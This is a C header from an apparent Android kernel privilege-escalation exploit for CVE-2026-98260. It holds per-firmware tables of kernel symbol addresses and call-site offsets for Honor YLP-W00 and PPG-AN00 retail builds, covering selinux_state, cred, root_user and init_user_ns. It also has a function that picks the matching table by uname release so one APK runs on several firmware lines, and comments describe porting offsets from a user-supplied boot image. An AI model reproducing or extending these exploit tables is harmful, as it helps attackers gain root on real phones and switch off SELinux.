/*
 * CVE-2026-98260 kernel profiles.
 *
 * The exploit uses compile-time call-site, symbol and structure offsets.  Keep
 * one table for every supported release and select by the exact uname release
 * at runtime, so a single binary/APK can run on both YLP-W00 firmware lines.
 */
#ifndef CVE98260_KERNEL_PROFILE_H
#define CVE98260_KERNEL_PROFILE_H

#include <string.h>
#include <sys/utsname.h>

struct cve98260_profile {
    const char *release;
    const char *label;
    int verified;
    /* Boot-assigned trace event IDs.  Zero means "probe at runtime". */
    unsigned trace_kmem_alloc;
    unsigned trace_kmalloc;
    unsigned trace_mm_page_free;
    unsigned trace_mm_page_alloc;
    unsigned long long timer_site;
    unsigned long long timer_low21;
    unsigned long long task_site;
    unsigned long long task_low21;
    unsigned long long cred_low21;
    unsigned long long selinux_state;
    unsigned long long root_user;
    unsigned long long init_user_ns;
    unsigned long long init_groups;
    unsigned long long init_ucounts;
};

static const struct cve98260_profile cve98260_profiles[] = {
    {
        "6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k",
        "YLP-W00 6.12.38 (verified)",
        1,
        318, 319, 322, 324,
        0xffffffc080d99f70ULL, 0x199f70ULL,
        0xffffffc080da63b4ULL, 0x1a63b4ULL,
        0x18a248ULL,
        0xffffffc0826663c8ULL,
        0xffffffc0824017e0ULL,
        0xffffffc082401568ULL,
        0xffffffc082402ca8ULL,
        0xffffffc082403178ULL,
    },
    {
        "6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k",
        "YLP-W00 6.12.58 (verified)",
        1,
        0, 0, 0, 0,
        0xffffffc08051a110ULL, 0x11a110ULL,
        0xffffffc0801f0d64ULL, 0x1f0d64ULL,
        0x19c474ULL,
        0xffffffc0827e7a60ULL,
        0xffffffc0825723b0ULL,
        0xffffffc082572138ULL,
        0xffffffc082573878ULL,
        0xffffffc082573d48ULL,
    },
    {
        /*
         * HONOR PPG-AN00 retail Android 16 boot image supplied by the user
         * (boot.img, header v4, uncompressed arm64 Image):
         * 6.12.58-android16-6-gdf8d34cadbf7-abogki584560711-4k.
         *
         * Static adaptation: BTF + kallsyms were read straight out of that
         * Image, and the three call sites were decoded by hand (BL imm26):
         *   do_timer_create+0xa8 -> kmem_cache_alloc_noprof,      ret 0x517bec
         *   copy_process+0x13c   -> kmem_cache_alloc_node_noprof, ret 0x1f2938
         *   prepare_creds+0x28   -> kmem_cache_alloc_noprof,      ret 0x19b1fc
         * trace event IDs stay 0 so the runtime probe supplies them.
         */
        "6.12.58-android16-6-gdf8d34cadbf7-abogki584560711-4k",
        "HONOR PPG-AN00 6.12.58 (user boot.img; static adaptation; runtime pending)",
        0,
        0, 0, 0, 0,
        0xffffffc080517becULL, 0x117becULL,
        0xffffffc0801f2938ULL, 0x1f2938ULL,
        0x19b1fcULL,
        0xffffffc0827d6520ULL,
        0xffffffc082562958ULL,
        0xffffffc0825626e0ULL,
        0xffffffc082563e20ULL,
        0xffffffc0825642f0ULL,
    },
    {
        /*
         * MagicOS 11.0.0.117(SP4) OTA boot image:
         * 6.12.58-android16-6-g142ddad31e60-abogki576095858-4k.
         *
         * Static adaptation only: the target kernel was not booted on the
         * device.  Call sites were read from the OTA vmlinux:
         *   do_timer_create+0xa8 -> kmem_cache_alloc_noprof, ret 0x51a918
         *   copy_process+0x18c  -> kmem_cache_alloc_node_noprof, ret 0x1f06e0
         *   prepare_creds+0x28  -> kmem_cache_alloc_noprof, ret 0x1935e4
         * selinux_state and the init_* symbols did not move; trace event IDs
         * are left at 0 so the runtime probe must supply them.
         */
        "6.12.58-android16-6-g142ddad31e60-abogki576095858-4k",
        "YLP-W00 6.12.58 / MagicOS 11.0.0.117(SP4) (static adaptation; runtime pending)",
        0,
        0, 0, 0, 0,
        0xffffffc08051a918ULL, 0x11a918ULL,
        0xffffffc0801f06e0ULL, 0x1f06e0ULL,
        0x1935e4ULL,
        0xffffffc0827e7a60ULL,
        0xffffffc0825723b0ULL,
        0xffffffc082572138ULL,
        0xffffffc082573878ULL,
        0xffffffc082573d48ULL,
    },
};

static const struct cve98260_profile *cve98260_active_profile;

static const struct cve98260_profile *cve98260_profile_select(void)
{
    struct utsname u;
    size_t i;

    if (uname(&u) != 0)
        return NULL;
    for (i = 0; i < sizeof(cve98260_profiles) / sizeof(cve98260_profiles[0]); i++)
        if (!strcmp(u.release, cve98260_profiles[i].release))
            return &cve98260_profiles[i];
    return NULL;
}

#endif /* CVE98260_KERNEL_PROFILE_H */
